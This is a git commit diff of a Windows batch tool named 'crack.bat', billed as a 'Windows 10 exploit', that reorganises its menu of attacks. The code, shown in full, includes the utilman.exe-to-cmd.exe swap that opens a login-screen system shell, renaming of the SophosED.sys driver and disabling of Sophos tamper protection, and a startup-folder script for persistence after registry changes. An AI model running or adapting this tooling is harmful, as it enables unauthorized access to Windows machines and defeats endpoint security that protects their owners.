9c4664d18bb425ba262a80eadb5d860f5bd82cee
Viren070 <viren070@protonmail.com>
2023-05-16 18:38:20 +0000

    merge main into improved-error-handling 1

--- src/crack.bat
+++ src/crack.bat
@@ -33,14 +33,21 @@ echo ^|==================================^|
 echo ^|  WINDOWS 10  EXPLOIT BY S1rDyn0  ^|
 echo ^|   ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~    ^| 
 echo ^|                                  ^|
-echo ^|  BUILD ^| Production    23.5.10  ^|
+echo ^|  BUILD ^| Production     23.5.9  ^|
 echo ^|==================================^| & echo: & echo:
+
+echo +++++ Password Exploit
 echo ^[1^] Local Password Exploit
-echo ^[2^] Disable Sophos Tamper Protection
-echo ^[3^] Password ^& Sophos Exploit
-echo ^[4^] Show On-Screen Keyboard
-echo ^[5^] Restore Password Exploit
-echo ^[6^] Recover Files from Backup
+echo ^[2^] Undo Password Exploit
+echo ^[3^] Restore Original Files
+
+echo: & echo +++++ Sophos Exploit
+echo ^[4^] Disable Sophos Tamper Protection
+echo ^[5^] Sophos Registry Exploit
+
+echo: & echo +++++ Other
+echo ^[6^] Show On-Screen Keyboard
+echo: & echo +++++ Exit
 echo ^[0^] Exit
 echo: & echo: & echo:
 
@@ -62,7 +69,8 @@ if not !optionFound!==true (
   timeout /t 5 
   goto menu
 )
-
+echo you have a valid option 
+pause
 if "!crackType!" EQU "0" (
   color 07
   cls & echo Exiting...
@@ -70,18 +78,25 @@ if "!crackType!" EQU "0" (
 )
 
 if "!crackType!" EQU "1" (
-  call :exploit1
+  call :local-password-exploit
 )
 
 if "!crackType!" EQU "2" (
-  call :exploit2
+  call :undo-password-exploit
 )
 
 if "!crackType!" EQU "3" (
-  call :exploit3
+  call :restore-original-files
 )
 
 if "!crackType!" EQU "4" (
+  call :disable-sophos-tamper-protection
+)
+if "!crackType!" EQU "5" (
+  call :sophos-registry-exploit
+)
+
+if "!crackType!" EQU "6" (
   echo Running OSK.exe...
   start "" "C:\windows\system32\osk.exe" || goto :cmdFail
   color 0A
@@ -93,18 +108,10 @@ if "!crackType!" EQU "4" (
   goto :menu
 )
 
-if "!crackType!" EQU "5" (
-  call :exploit5
-)
-
-if "!crackType!" EQU "6" (
-  call :exploit6
-)
-
 goto :menu
 
 
-:exploit1
+:local-password-exploit
 cls
 echo Starting Hack
 echo.
@@ -133,7 +140,12 @@ if exist "c:\windows\system32" (
   goto menu
 )
 
-:exploit2
+
+rem Option 4 is for the Sophos registry hack. This will use xcopy to make a new folder at C:\SophosUtility
+rem It will next copy the sophos folder inside that directory.
+rem Then it will copy evoke.bat to C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup as shortcut creation requires vbs script and not good choice in recovery environment
+rem this will run autorun.bat script located in C:\SophosUtility\Sophos\autorub.bat
+:disable-sophos-tamper-protection
 cls
 echo Starting Hack
 if exist "c:\windows\system32\drivers" (
@@ -157,51 +169,32 @@ if exist "c:\windows\system32\drivers" (
   echo Failing Exploit and returning to menu
   timeout /t 5 
   goto menu
-)
+) 
 
-:exploit3
+:sophos-registry-exploit
 cls
-echo Starting Hack
-if exist "c:\windows\system32" (
-  echo System Directory Found
+echo Preparing Patch...
+if /i exist "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" ( echo Located Startup folder ) else ( echo Could not find Startup folder... & echo: & echo Failing Registry Patch & goto :cmdFail )
+if /i exist "x:\sources\sophos" ( echo Located Sophos folder ) else ( echo Could not find Sophos folder... & echo: & echo Failing Registry Patch & goto :cmdFail )
+if /i exist "x:\sources\sophos\1EndpointDefense.reg" ( echo Located Registry Patch file 1/2 ) else ( echo Could not find Regsitry File number 1... & echo: & echo Failing Registry Patch & goto :cmdFail )
+if /i exist "x:\sources\sophos\2SophosMCSAgent.reg" ( echo Located Registry Patch file 2/2 ) else ( echo Could not find Regsitry File number 2... & echo: & echo Failing Registry Patch & goto :cmdFail )
+if /i exist "x:\sources\sophos\autorun.bat" ( echo Located Autorun Script ) else ( echo Could not find the Autorun Script... & echo: & echo Failing Registry Patch & goto :cmdFail )
 
-  echo Renaming utilman.exe to utilman.old
-  ren C:\windows\system32\utilman.exe utilman.old || goto :cmdFail
+echo Patch files located! & echo: & echo Starting Patch...
+echo Creating Patch folder
+mkdir C:\SophosUtility || goto :cmdFail
 
-  echo Copying cmd.exe to utilman.exe
-  copy C:\windows\system32\cmd.exe C:\windows\system32\utilman.exe || goto :cmdFail
+echo Copying patch files to target folder
+copy X\:sources\sophos C:\SophosUtility || goto :cmdFail
 
-  if exist "c:\windows\system32\drivers" (
-    echo System Directory Found
-      
-    echo Renaming SophosED.sys to SophosED.sys.old
-    ren C:\windows\system32\drivers\SophosED.sys SophosED.sys.old || goto :cmdFail
+echo Copying evoker to autorun folder
+copy C:\SophosUtility\sophos\evoke.bat  "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" || goto cmdFail
 
-    color 0A
-    echo -----------------------------------
-    echo Exploit Completed ^| No errors
-    pause
-    goto menu
+echo -----------------------------------
+echo Sophos Registry Patch Completed ^| No errors
+pause
 
-  ) else (
-    color 0C
-    call :showDinoError
-    echo Could not find System Directory... & echo:
-    echo Failing Exploit and returning to menu
-    timeout /t 5 
-    goto menu
-  )
-
-) else (
-  color 0C 
-  call :showDinoError
-  echo Could not find System Directory... & echo:
-  echo Failing Exploit and returning to menu
-  timeout /t 5 
-  goto menu
-)
-
-:exploit5
+:undo-password-exploit
 cls
 echo Preparing restore...
 if exist "c:\windows\system32" (
@@ -253,7 +246,7 @@ echo Restore Completed ^| No errors
 pause
 goto menu
 
-:exploit6
+:restore-original-files
 cls
 echo Preparing restore...
 if exist "x:\sources\restore" (
@@ -311,4 +304,4 @@ echo      _.----._/ /
 echo     /         /
 echo  __/ ^(  ^| ^(  ^|
 echo /__.-^'^|_^|--^|_^|
-echo EXPLOIT ERROR... & echo:
+echo Exploit ID !crackType! failed & echo:
